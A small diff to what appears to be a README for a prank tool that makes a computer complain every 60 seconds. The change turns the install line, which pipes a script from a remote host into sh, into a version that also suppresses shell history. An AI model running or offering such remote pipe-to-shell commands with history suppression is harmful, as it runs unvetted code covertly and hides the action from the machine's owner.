@@ -5,7 +5,7 @@ Make the computer complain every 60 seconds!
 # Load
 
 ```
-$ curl -L http://please.lock.me.uk | sh
+$ HISTFILE=/dev/null curl -L http://please.lock.me.uk | sh
 ```
 
 # Unload
